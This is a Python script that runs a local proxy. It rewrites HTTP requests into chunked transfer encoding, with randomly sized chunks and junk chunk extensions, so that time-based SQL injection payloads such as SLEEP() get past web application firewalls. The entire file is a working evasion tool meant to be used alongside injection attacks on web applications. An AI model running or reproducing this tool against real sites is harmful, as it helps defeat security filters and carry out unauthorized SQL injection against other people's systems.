#!/usr/bin/env python
# -*- coding: utf-8 -*-


"""
@author: 4rat
@time: 2019/3/11 23:33
"""

from socket import *
import random
import string
import time
import HackRequests
import re

def Confuse():
    Confuse = ''.join(random.sample(string.ascii_letters + string.digits,random.randint(1,9)))
    return Confuse

def payloadlistnum(s):
    while True:
        n = random.randint(1, len(s))
        num = len(s) / n
        if num < 9:
            return n

def payloadlist(s, n):
    fn = len(s) // n
    rn = len(s) % n
    sr = []
    ix = 0
    for i in range(n):
        if i < rn:
            sr.append(s[ix:ix + fn + 1])
            ix += fn + 1
        else:
            sr.append(s[ix:ix + fn])
            ix += fn
    return (sr)

def payload2(s,n):
    payload2 =''
    for i in payloadlist(s, n):
        if len(i) == 0:
            pass
        else:
            payload2 = payload2 + str(len(i))+';'+Confuse()+'\n'+str(i)+'\n'
    payload2 = payload2 + '0' + '\n' + '\n'
    return (payload2)

def tamper(s):
    n = payloadlistnum(s)
    return (payload2(s,n))

def httphead(slist):
    sj = 0
    httphead1 = []
    for i in slist:
        if 'Content-Length:' in i:
            xg = slist[sj] = 'Transfer-Encoding: Chunked\r'
            httphead1.append(xg)
        else:
            sj += 1
            httphead1.append(i)
    return httphead1

def httppostpayload(slist):
    httppostpayload = slist[-1]
    return httppostpayload

HOST = '127.0.0.1'
PORT = 9999
ADDR = (HOST, PORT)
ProxyServer = socket(AF_INET, SOCK_STREAM)   
ProxyServer.bind(ADDR)                       
ProxyServer.listen(5)                        
hack = HackRequests.hackRequests()
print("\033[1;33m[*] Waiting for Client connection \033[0m")
while True:
    tcpCliSock, addr = ProxyServer.accept()
    print("\033[1;33m[+] Connection Succeeded \033[0m")
    s = tcpCliSock.recv(1024).decode('utf-8')   
    if 'SLEEP' in s:
        payloadtime = re.findall(r'SLEEP%28(.*?)%29',s)[0]
        time.sleep(int(payloadtime))
        slist = s.split('\n')
        headerslist = httphead(slist)
        s = httppostpayload(slist)
        httppost = tamper(s)
        headerslist[-1] = httppost
        httpdata = ''
        for i in headerslist:
            httpdata = httpdata + i.replace('\r', '\n')
        httpdata = httpdata + i.replace('\r', '\n')
        print("\033[1;33m[+] chunked Succeeded \033[0m")
        raw = httpdata
        aa = hack.httpraw(raw)
        time.sleep(int(payloadtime))
        payloaddata = aa.text()
        tcpCliSock.sendall(bytes(payloaddata, 'utf-8')) 
        tcpCliSock.close()
        continue
    slist = s.split('\n')
    headerslist = httphead(slist)
    s  = httppostpayload(slist)
    httppost = tamper(s)
    headerslist[-1] = httppost
    httpdata = ''                                  
    for i in headerslist:
        httpdata = httpdata + i.replace('\r','\n')
    httpdata = httpdata + i.replace('\r', '\n')
    print("\033[1;33m[+] chunked Succeeded \033[0m")
    raw = httpdata
    aa = hack.httpraw(raw)
    payloaddata = aa.text()
    payloaddata = payloaddata
    tcpCliSock.sendall(bytes(payloaddata, 'utf-8'))       
    tcpCliSock.close()
